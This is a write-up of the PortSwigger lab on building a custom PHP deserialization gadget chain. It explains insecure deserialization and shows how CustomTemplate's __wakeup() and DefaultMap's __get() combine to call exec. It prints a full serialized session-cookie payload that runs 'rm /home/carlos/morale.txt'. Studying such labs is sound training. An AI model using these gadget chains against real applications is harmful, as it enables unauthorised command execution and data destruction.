# Lab: Developing a custom gadget chain for PHP deserialization

**Official lab:** [https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization)

## Lab idea

This challenge examines how PHP object lifecycle behavior and related application classes can combine into a custom gadget chain. It practices source-code review and understanding how deserialized object interactions can lead to a serious server-side effect.

## Vulnerability in brief
Serialization converts an object and its state into a format that can be stored or transmitted; deserialization rebuilds that data as a usable object. Insecure deserialization occurs when an application deserializes data that an attacker can control. Because object fields and, in some implementations, object types are restored, crafted data may influence application logic before or during normal use of the object. This is a vulnerability class, not a general learning or testing category.

## Solution idea
1. Log in to your own account and notice that the session cookie contains a serialized PHP object.
2. In the source code, notice that the __wakeup() magic method for a CustomTemplate will create a new Product by referencing the default_desc_type and desc from the CustomTemplate .
3. Also notice that the DefaultMap class has the __get() magic method, which will be invoked if you try to read an attribute that doesn't exist for this object.
4. You can exploit this gadget chain to invoke exec(rm /home/carlos/morale.txt) by passing in a CustomTemplate object where: CustomTemplate->default_desc_type = "rm /home/carlos/morale.txt"…
5. To solve the lab, Base64 and URL-encode the following serialized object, and pass it into the website via your session cookie: O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm…

## Payloads / key values
- `/cgi-bin/libs/CustomTemplate.php`
- `.php~`
- `__wakeup()`
- `CustomTemplate`
- `Product`
- `default_desc_type`
- `desc`
- `DefaultMap`
- `__get()`
- `call_user_func()`
- `DefaultMap->callback`
- `$name`
- `exec(rm /home/carlos/morale.txt)`
- `CustomTemplate->default_desc_type = "rm /home/carlos/morale.txt"; CustomTemplate->desc = DefaultMap; DefaultMap->callback = "exec"`
- `exec()`
- `O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:4:"exec";}}`

## Official source
- [PortSwigger Academy: Lab: Developing a custom gadget chain for PHP deserialization](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization)
